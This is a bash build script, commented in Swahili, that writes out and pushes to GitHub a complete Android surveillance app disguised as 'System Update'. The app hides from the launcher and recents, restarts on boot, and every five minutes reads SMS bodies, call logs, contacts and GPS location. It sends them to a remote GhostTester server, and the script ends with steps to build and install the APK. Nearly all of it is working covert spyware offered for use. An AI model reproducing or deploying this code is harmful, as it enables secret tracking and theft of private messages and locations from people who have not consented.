#!/bin/bash
cd ~/android-surveillance-final2

echo "🔧 KUANDAA ANDROID APP KWA GHOST TESTER SERVER..."

# 1. Rekebisha AndroidManifest - kuongeza permissions zote
cat > app/src/main/AndroidManifest.xml << 'MANIFEST'
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    xmlns:tools="http://schemas.android.com/tools">

    <!-- Permissions zote muhimu za surveillance -->
    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.READ_SMS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />

    <application
        android:allowBackup="false"
        android:label="System Update"
        android:theme="@android:style/Theme.NoDisplay"
        android:persistent="true"
        tools:ignore="GoogleAppIndexingWarning">

        <!-- Stealth Activity - No icon in launcher -->
        <activity
            android:name=".StealthActivity"
            android:exported="true"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:taskAffinity=""
            android:launchMode="singleInstance">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!-- Login Activity - Only shows when no code -->
        <activity
            android:name=".LoginActivity"
            android:exported="false"
            android:excludeFromRecents="true"
            android:noHistory="true"
            android:theme="@style/Theme.AppCompat.DayNight.NoActionBar" />

        <!-- Stealth Service - Hidden background service -->
        <service
            android:name=".StealthService"
            android:enabled="true"
            android:exported="false"
            android:stopWithTask="false"
            android:foregroundServiceType="location|microphone|camera" />

        <!-- Boot Receiver - Auto-start on boot -->
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>
</manifest>
MANIFEST

# 2. Rekebisha LoginActivity - STRICT PARENT CODE VERIFICATION
cat > app/src/main/java/com/security/update/LoginActivity.java << 'LOGIN'
package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make window stealthy - no title, no status bar
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_login);
        
        // Check if already logged in
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (!savedCode.isEmpty() && isVerified) {
            // Already have verified code, go to stealth mode directly
            startStealthMode(savedCode);
            return;
        }
        
        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);
        
        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();
            
            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }
            
            // Verify code with GhostTester server - STRICT VERIFICATION
            verifyParentCode(code);
        });
    }
    
    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                // Server URL - GHOST TESTER SERVER
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                
                // Create JSON request
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);
                
                // Send verification request to server
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                // Send request
                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();
                
                // Get response
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();
                    
                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");
                    
                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.optString("parent_name", "Mzazi");
                            String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
                            saveCodeAndRequestPermissions(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.optString("error", "Parent code si sahihi!");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                            codeInput.setText("");
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao! Code: " + responseCode, Toast.LENGTH_LONG).show();
                        codeInput.setText("");
                    });
                }
                
            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "❌ Hitilafu: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    codeInput.setText("");
                });
            }
        }).start();
    }
    
    private void saveCodeAndRequestPermissions(String code, String parentName, String childPhone) {
        // Save code first
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("code_verified", true);
        editor.apply();
        
        // Request all permissions
        requestAllPermissions();
    }
    
    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE
        };
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
        } else {
            // For older versions, start stealth mode directly
            startStealthMode(prefs.getString("parent_code", ""));
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            for (int result : grantResults) {
                if (result != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    break;
                }
            }
            
            if (allGranted) {
                Toast.makeText(this, "✅ Permissions zote zimekubaliwa! Stealth mode inaanza...", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            } else {
                Toast.makeText(this, "⚠️ Baadhi ya permissions hazijakubaliwa. App haitafanya kazi vizuri.", Toast.LENGTH_LONG).show();
                startStealthMode(prefs.getString("parent_code", ""));
            }
        }
    }
    
    private void startStealthMode(String code) {
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        startService(stealthIntent);
        
        // Hide app completely
        moveTaskToBack(true);
        finish();
    }
    
    @Override
    public void onBackPressed() {
        // Prevent going back - force user to enter code
        moveTaskToBack(true);
    }
}
LOGIN

# 3. Rekebisha StealthService - DATA COLLECTION KILA DAKIKA 5
cat > app/src/main/java/com/security/update/StealthService.java << 'SERVICE'
package com.security.update;

import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.os.IBinder;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.Telephony;
import android.util.Log;
import android.Manifest;
import android.content.pm.PackageManager;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.File;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class StealthService extends Service {
    private static final String TAG = "StealthService";
    private Timer timer;
    private String parentCode;
    private SharedPreferences prefs;
    private LocationManager locationManager;
    private MediaRecorder mediaRecorder;
    private boolean isRecording = false;
    
    @Override
    public void onCreate() {
        super.onCreate();
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        Log.d(TAG, "🔍 StealthService imeanzishwa...");
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null && intent.hasExtra("PARENT_CODE")) {
            parentCode = intent.getStringExtra("PARENT_CODE");
            Log.d(TAG, "📱 Parent Code: " + parentCode);
        } else {
            parentCode = prefs.getString("parent_code", "");
            Log.d(TAG, "📱 Parent Code from prefs: " + parentCode);
        }
        
        startSurveillance();
        return START_STICKY;
    }
    
    private void startSurveillance() {
        if (timer != null) {
            timer.cancel();
        }
        
        timer = new Timer();
        
        // Start immediate data collection
        timer.schedule(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 0);
        
        // Schedule periodic data collection every 5 minutes
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                collectAndSendAllData();
            }
        }, 300000, 300000); // 5 minutes = 300000 ms
        
        Log.d(TAG, "📡 Surveillance imeanzishwa - data inatumwa kila baada ya dakika 5");
    }
    
    private void collectAndSendAllData() {
        try {
            JSONObject allData = new JSONObject();
            allData.put("parent_code", parentCode);
            allData.put("device_id", android.os.Build.MODEL);
            allData.put("timestamp", System.currentTimeMillis());
            allData.put("collection_time", new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date()));
            
            // Collect SMS data
            if (checkPermission(Manifest.permission.READ_SMS)) {
                allData.put("sms_data", collectSMSData());
            }
            
            // Collect calls data
            if (checkPermission(Manifest.permission.READ_CALL_LOG)) {
                allData.put("calls_data", collectCallsData());
            }
            
            // Collect contacts data
            if (checkPermission(Manifest.permission.READ_CONTACTS)) {
                allData.put("contacts_data", collectContactsData());
            }
            
            // Collect location data
            if (checkPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                allData.put("location_data", collectLocationData());
            }
            
            // Collect device info
            allData.put("device_info", collectDeviceInfo());
            
            // Send to GhostTester server
            sendToServer(allData);
            
        } catch (Exception e) {
            Log.e(TAG, "❌ Error collecting data: " + e.getMessage());
        }
    }
    
    private JSONArray collectSMSData() {
        JSONArray smsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                Telephony.Sms.CONTENT_URI,
                null, null, null,
                Telephony.Sms.DEFAULT_SORT_ORDER + " LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.ADDRESS)));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.BODY)));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.DATE)));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow(Telephony.Sms.TYPE)));
                    smsArray.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading SMS: " + e.getMessage());
        }
        return smsArray;
    }
    
    private JSONArray collectCallsData() {
        JSONArray callsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 50"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)));
                    call.put("duration", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)));
                    call.put("date", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)));
                    call.put("type", cursor.getString(cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)));
                    callsArray.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading calls: " + e.getMessage());
        }
        return callsArray;
    }
    
    private JSONArray collectContactsData() {
        JSONArray contactsArray = new JSONArray();
        try {
            Cursor cursor = getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC LIMIT 100"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
                    
                    JSONObject contact = new JSONObject();
                    contact.put("name", name);
                    
                    // Get phone numbers
                    Cursor phoneCursor = getContentResolver().query(
                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                        null,
                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                        new String[]{contactId},
                        null
                    );
                    
                    JSONArray phones = new JSONArray();
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            String phone = phoneCursor.getString(phoneCursor.getColumnIndexOrThrow(
                                ContactsContract.CommonDataKinds.Phone.NUMBER));
                            phones.put(phone);
                        }
                        phoneCursor.close();
                    }
                    contact.put("phones", phones);
                    contactsArray.put(contact);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error reading contacts: " + e.getMessage());
        }
        return contactsArray;
    }
    
    private JSONObject collectLocationData() {
        JSONObject location = new JSONObject();
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null && locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                Location lastLocation = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (lastLocation != null) {
                    location.put("latitude", lastLocation.getLatitude());
                    location.put("longitude", lastLocation.getLongitude());
                    location.put("accuracy", lastLocation.getAccuracy());
                    location.put("timestamp", lastLocation.getTime());
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error getting location: " + e.getMessage());
        }
        return location;
    }
    
    private JSONObject collectDeviceInfo() {
        JSONObject deviceInfo = new JSONObject();
        try {
            deviceInfo.put("model", android.os.Build.MODEL);
            deviceInfo.put("manufacturer", android.os.Build.MANUFACTURER);
            deviceInfo.put("android_version", android.os.Build.VERSION.RELEASE);
            deviceInfo.put("sdk_version", android.os.Build.VERSION.SDK_INT);
            deviceInfo.put("product", android.os.Build.PRODUCT);
            deviceInfo.put("device", android.os.Build.DEVICE);
        } catch (Exception e) {
            Log.e(TAG, "Error collecting device info: " + e.getMessage());
        }
        return deviceInfo;
    }
    
    private boolean checkPermission(String permission) {
        return checkSelfPermission(permission) == PackageManager.PERMISSION_GRANTED;
    }
    
    private void sendToServer(JSONObject data) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/surveillance";
                
                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);
                
                OutputStream os = conn.getOutputStream();
                os.write(data.toString().getBytes());
                os.flush();
                os.close();
                
                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    Log.d(TAG, "✅ Data imetumwa kikamilifu kwa server - " + new Date());
                } else {
                    Log.e(TAG, "❌ Server returned error: " + responseCode);
                }
                
            } catch (Exception e) {
                Log.e(TAG, "❌ Error sending data: " + e.getMessage());
            }
        }).start();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        if (timer != null) {
            timer.cancel();
        }
        Log.d(TAG, "🔴 StealthService imezimwa");
    }
}
SERVICE

# 4. Rekebisha StealthActivity - BLOCK ACCESS BILA CODE
cat > app/src/main/java/com/security/update/StealthActivity.java << 'ACTIVITY'
package com.security.update;

import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;
import androidx.appcompat.app.AppCompatActivity;

public class StealthActivity extends AppCompatActivity {
    
    private SharedPreferences prefs;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // Make completely invisible
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN, 
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        // No setContentView - completely invisible
        
        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        
        // STRICT CHECK: Must have verified parent code
        String parentCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        
        if (parentCode.isEmpty() || !isVerified) {
            // No valid code, show login IMMEDIATELY
            Intent loginIntent = new Intent(this, LoginActivity.class);
            startActivity(loginIntent);
        } else {
            // Already have verified code, start stealth service directly
            Intent serviceIntent = new Intent(this, StealthService.class);
            serviceIntent.putExtra("PARENT_CODE", parentCode);
            startService(serviceIntent);
        }
        
        // Hide immediately
        moveTaskToBack(true);
        finish();
    }
}
ACTIVITY

# 5. Rekebisha BootReceiver - AUTO-START WITH CODE VERIFICATION
cat > app/src/main/java/com/security/update/BootReceiver.java << 'BOOT'
package com.security.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";
    
    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Log.d(TAG, "📱 Device imewashwa - kuanzisha surveillance...");
            
            SharedPreferences prefs = context.getSharedPreferences("SurveillanceApp", Context.MODE_PRIVATE);
            String parentCode = prefs.getString("parent_code", "");
            boolean isVerified = prefs.getBoolean("code_verified", false);
            
            // ONLY start if we have verified parent code
            if (!parentCode.isEmpty() && isVerified) {
                Intent serviceIntent = new Intent(context, StealthService.class);
                serviceIntent.putExtra("PARENT_CODE", parentCode);
                context.startService(serviceIntent);
                Log.d(TAG, "✅ StealthService imeshtakiwa baada ya boot");
            } else {
                Log.d(TAG, "❌ Hakuna parent code iliyothibitishwa - haijaanzishwa");
            }
        }
    }
}
BOOT

echo "✅ Android app imerekebishwa kikamilifu!"
echo ""
echo "📱 FEATURES MPYA:"
echo "   🔒 HAIFUNGI mpaka parent code sahihi iwekwe"
echo "   ✅ Inathibitisha code na GhostTester server"
echo "   📞 Inakusanya data zote (SMS, simu, anwani, location)"
echo "   ⏰ Inatumia data kila baada ya dakika 5"
echo "   🚀 Inaanza wenyewe baada ya boot"
echo "   🎯 Data inatumwa kwenye parent code iliyowekwa tu"

# 6. Sasa push kwenye GitHub kwa ajili ya GitHub Actions build
echo ""
echo "📤 Inapush mabadiliko kwenye GitHub..."

git add .
git commit -m "🔒 STRICT PARENT CODE VERIFICATION & DATA COLLECTION
- App haifunguki mpaka parent code sahihi iwekwe
- Inathibitisha code na GhostTester server
- Inakusanya data zote (SMS, calls, contacts, location)
- Inatumia data kila baada ya dakika 5
- Permissions zote zinatafutwa baada ya kufunguka
- Data inatumwa kwenye parent code iliyothibitishwa"

git push origin main

echo ""
echo "✅ IMEKWISHA! Sasa:"
echo "   1. Nenda https://github.com/CronosKIng/android-surveillance-final2/actions"
echo "   2. Subiri APK ijengwe"
echo "   3. Download APK na uiinstall kwenye simu"
echo "   4. Weke parent code kutoka GhostTester"
echo "   5. App itafunguka na kuanza kutuma data!"
